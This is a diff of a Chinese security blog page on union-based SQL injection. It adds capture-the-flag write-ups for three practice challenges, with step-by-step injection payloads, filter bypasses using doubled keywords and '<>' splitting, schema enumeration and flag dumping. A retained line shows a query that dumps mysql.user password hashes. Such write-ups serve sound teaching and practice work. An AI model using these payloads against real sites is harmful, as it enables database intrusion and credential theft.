@@ -95,10 +95,13 @@
 <meta property="og:site_name" content="Keven S">
 <meta property="og:description" content="0x00 注入过程三种注入123where user_id = 1 or 1=1where user_id = &amp;apos;1&amp;apos; or &amp;apos;1&amp;apos;=&amp;apos;1&amp;apos;where user_id =&amp;quot; 1 &amp;quot;or &amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;  注释符12345#          单行注释,常编码为%23--空格">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-10-21T14:16:35.002Z">
+<meta property="og:image" content="https://i.loli.net/2019/10/22/jO89dQV7RFIGxKq.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/22/EpQBtF64zMTIqwf.png">
+<meta property="og:updated_time" content="2019-10-22T09:44:15.514Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL回显注入">
 <meta name="twitter:description" content="0x00 注入过程三种注入123where user_id = 1 or 1=1where user_id = &amp;apos;1&amp;apos; or &amp;apos;1&amp;apos;=&amp;apos;1&amp;apos;where user_id =&amp;quot; 1 &amp;quot;or &amp;quot;1&amp;quot;=&amp;quot;1&amp;quot;  注释符12345#          单行注释,常编码为%23--空格">
+<meta name="twitter:image" content="https://i.loli.net/2019/10/22/jO89dQV7RFIGxKq.png">
 
 
 
@@ -388,8 +391,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-10-21T22:16:35+08:00">
-                2019-10-21
+              <time title="更新于" itemprop="dateModified" datetime="2019-10-22T17:44:15+08:00">
+                2019-10-22
               </time>
             
           </span>
@@ -444,7 +447,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  268 字
+                  1,214 字
                 </span>
               
 
@@ -460,7 +463,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  1 分钟
+                  6 分钟
                 </span>
               
             </div>
@@ -505,6 +508,81 @@
 
 <h4 id="猜-root-用户"><a href="#猜-root-用户" class="headerlink" title="猜 root 用户"></a>猜 root 用户</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,group_concat(user,password) from mysql.user#</span><br></pre></td></tr></table></figure>
 
+<h2 id="0x01-bugku-这是一个神奇的登录框"><a href="#0x01-bugku-这是一个神奇的登录框" class="headerlink" title="0x01 bugku 这是一个神奇的登录框"></a>0x01 bugku 这是一个神奇的登录框</h2><p>1、打开题目链接，是一个登录界面，抓包后传数据进行尝试</p>
+<p>2、先尝试admin_name=1&amp;admin_passwd=1&amp;submit=GO+GO+GO 得到Try Again!</p>
+<p>3、尝试admin_name=1’&amp;admin_passwd=1&amp;submit=GO+GO+GO 仍然得到Try Again! ，说明 ’被过滤了</p>
+<p>4、尝试admin_name=1”&amp;admin_passwd=1&amp;submit=GO+GO+GO</p>
+<p>得到You have an error in your SQL syntax; check the manual that corresponds to<br>your MySQL server version for the right syntax to use near ‘1”‘ at line 1 说明应该用 “ 分隔,”符号没有被过滤。</p>
+<p>5、尝试admin_name=1”%23&amp;admin_passwd=1&amp;submit=GO+GO+GO 发现<br>没有报错了，说明，需要注释掉一些多余的东西来得到正确结果</p>
+<p>6、判断回显位置</p>
+<p>admin_name=1” union select 1%23&amp;admin_passwd=1&amp;submit=GO+GO+GO</p>
+<p>得到The used SELECT statements have a different number of<br>columns（因为union前后的列数不相同）</p>
+<p>再改payload为</p>
+<p>admin_name=1” union select 1，2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO</p>
+<p>发现回显位置在Login_name那里</p>
+<p>7、爆数据库名</p>
+<p>admin_name=1” union select database(),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO</p>
+<p>得到bugkusql1</p>
+<p>8、爆表名</p>
+<p>admin_name=1” union select (select table_name from information_schema.tables<br>where table_schema=database() limit 0,1),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO</p>
+<p>得到flag1</p>
+<p>改limit 0,1为limt 1,1 得到whoami</p>
+<p>9、爆字段</p>
+<p>admin_name=1” union select (select column_name from information_schema.columns<br>where table_name=’flag1’),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO</p>
+<p>得到flag1</p>
+<p>10、flag</p>
+<p>admin_name=1” union select (select flag1 from<br>flag1),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO</p>
+<p>得到ed6b28e684817d9efcaf802979e57aea</p>
+<p>备注</p>
+<p>在admin_name或者admin_passwd 两处都可以进行爆破</p>
+<p>最初尝试admin_name=1” union select<br>1，2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO时没有看出来回显在1处，导致，再次尝试admin_name=1”<br>union select 1，database()%23&amp;admin_passwd=1&amp;submit=GO+GO+GO时发现没有回显</p>
+<p>用错误注入updatexml也可以得到数据库名，表名，字段名，但是<br>爆flag时，因为flag太长，导致无法全部回显</p>
+<h2 id="0x02-bugku-多次"><a href="#0x02-bugku-多次" class="headerlink" title="0x02 bugku 多次"></a>0x02 bugku 多次</h2><p><strong>很明显 注入点在id上</strong></p>
+<p><img src="https://i.loli.net/2019/10/22/jO89dQV7RFIGxKq.png" alt="duoci1.png"></p>
+<p>参数id只有5个，等于6的时候显示Error</p>
+<p><img src="https://i.loli.net/2019/10/22/EpQBtF64zMTIqwf.png" alt="duoci2.png"></p>
+<p>测试1 id=1’ or 1=1#</p>
+<p>返回错误，猜测可能有字符被过滤</p>
+<p>测试2 id=1’ oorr 1=1–+</p>
+<p>返回正常结果，通过双写绕过</p>
+<p><strong>异或注入</strong></p>
+<p>id=1’^(length(‘被测试字符’)=0)–+</p>
+<p>例如：id=1’^(length(‘select’)=0)–+      发现返回错误</p>
+<p>因为select被过滤，那么length(‘’)就等于0，(length(‘’)=0)此等式成立，返回值为1，再和1异或结果为0，所以页面返回错误</p>
+<p>检测出select、and 、or被过滤</p>
+<p>注意：information中有一个or</p>
+<p>同样道理，测试出过滤字符 select,union,and,or</p>
+<p>可以采用双写绕过。测试payload：</p>
+<p><a href="http://120.24.86.145:9004/1ndex.php?id=1%27%20anandd%201=2%20ununionion%20seselectlect%201,2%23" target="_blank" rel="noopener">http://120.24.86.145:9004/1ndex.php?id=1%27%20anandd%201=2%20ununionion%20seselectlect%201,2%23</a></p>
+<p>页面结果</p>
+<p>2</p>
+<p><strong>database:</strong></p>
+<p>?id=1%27%20anandd%201=2%20ununionion%20seselectlect%201,database()%23</p>
+<p>web1002-1</p>
+<p><strong>tables:</strong></p>
+<p>注意information里面有or，要双写过滤</p>
+<p>?id=-1’ ununionion seselectlect 1, group_concat(table_name) from<br>infoorrmation_schema.tables where table_schema=database() #</p>
+<p>页面结果</p>
+<p>flag1,hint</p>
+<p><strong>columns:</strong></p>
+<p>?id=-1’ ununionion seselectlect 1, group_concat(column_name) from<br>infoorrmation_schema.columns where table_schema=database() anandd<br>table_name=’flag1’ %23</p>
+<p>页面结果</p>
+<p>flag1,address</p>
+<p><strong>dump:</strong></p>
+<p>?id=-1’ ununionion seselectlect 1, group_concat(flag1) from flag1 %23</p>
+<p>页面结果</p>
+<p>usOwycTju+FTUUzXosjr</p>
+<p>?id=-1’ ununionion seselectlect 1, group_concat(address) from flag1 %23</p>
+<h2 id="0x04-百度杯sql"><a href="#0x04-百度杯sql" class="headerlink" title="0x04 百度杯sql"></a>0x04 百度杯sql</h2><p>总结：用&lt;&gt;隔开敏感字符，绕过防注入</p>
+<p>Order by 3与 union select 1，2，3都可以判断列数</p>
+<p>输入and 1=1  发现被拦截  此外 测试了or 发现也进行了拦截</p>
+<p>我们可以用下面的字符来替换 and 和 or</p>
+<p>and—-&gt;&amp;&amp;    ,     or—–&gt; ||      </p>
+<p>替换后发现可以成功绕过</p>
+<p>接下来进行猜字段长度  发现order by 被拦截<br>用&lt;&gt;把字符隔开，这里需要注意不要这样隔开or&lt;&gt;der<br>,这样or又是一个被拦截的字符</p>
+<p>然后利用二分法，才接触长度为3</p>
+<p>在注入的时候select会被拦截，同样我们用&lt;&gt;把字符分开即可</p>
+<p>界面出现2，我们就在2的位置进行注入</p>
 
       
     </div>
@@ -817,7 +895,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-注入过程"><span class="nav-number">1.</span> <span class="nav-text">0x00 注入过程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#三种注入"><span class="nav-number">1.0.1.</span> <span class="nav-text">三种注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注释符"><span class="nav-number">1.0.2.</span> <span class="nav-text">注释符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#判断字段数"><span class="nav-number">1.0.3.</span> <span class="nav-text">判断字段数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#确定回显点"><span class="nav-number">1.0.4.</span> <span class="nav-text">确定回显点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查询数据库信息"><span class="nav-number">1.0.5.</span> <span class="nav-text">查询数据库信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查询用户名，数据库名"><span class="nav-number">1.0.6.</span> <span class="nav-text">查询用户名，数据库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查询表名"><span class="nav-number">1.0.7.</span> <span class="nav-text">查询表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查询列名"><span class="nav-number">1.0.8.</span> <span class="nav-text">查询列名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件读取"><span class="nav-number">1.0.9.</span> <span class="nav-text">文件读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#写入-webshell"><span class="nav-number">1.0.10.</span> <span class="nav-text">写入 webshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#猜用户数据"><span class="nav-number">1.0.11.</span> <span class="nav-text">猜用户数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#猜-root-用户"><span class="nav-number">1.0.12.</span> <span class="nav-text">猜 root 用户</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-注入过程"><span class="nav-number">1.</span> <span class="nav-text">0x00 注入过程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#三种注入"><span class="nav-number">1.0.1.</span> <span class="nav-text">三种注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注释符"><span class="nav-number">1.0.2.</span> <span class="nav-text">注释符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#判断字段数"><span class="nav-number">1.0.3.</span> <span class="nav-text">判断字段数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#确定回显点"><span class="nav-number">1.0.4.</span> <span class="nav-text">确定回显点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查询数据库信息"><span class="nav-number">1.0.5.</span> <span class="nav-text">查询数据库信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查询用户名，数据库名"><span class="nav-number">1.0.6.</span> <span class="nav-text">查询用户名，数据库名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查询表名"><span class="nav-number">1.0.7.</span> <span class="nav-text">查询表名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查询列名"><span class="nav-number">1.0.8.</span> <span class="nav-text">查询列名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件读取"><span class="nav-number">1.0.9.</span> <span class="nav-text">文件读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#写入-webshell"><span class="nav-number">1.0.10.</span> <span class="nav-text">写入 webshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#猜用户数据"><span class="nav-number">1.0.11.</span> <span class="nav-text">猜用户数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#猜-root-用户"><span class="nav-number">1.0.12.</span> <span class="nav-text">猜 root 用户</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-bugku-这是一个神奇的登录框"><span class="nav-number">2.</span> <span class="nav-text">0x01 bugku 这是一个神奇的登录框</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-bugku-多次"><span class="nav-number">3.</span> <span class="nav-text">0x02 bugku 多次</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-百度杯sql"><span class="nav-number">4.</span> <span class="nav-text">0x04 百度杯sql</span></a></li></div>
             
 
           </div>
@@ -875,7 +953,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">全站共 20.5k 字</span>
+  <span class="post-count">全站共 21.4k 字</span>
 </div>
 
         
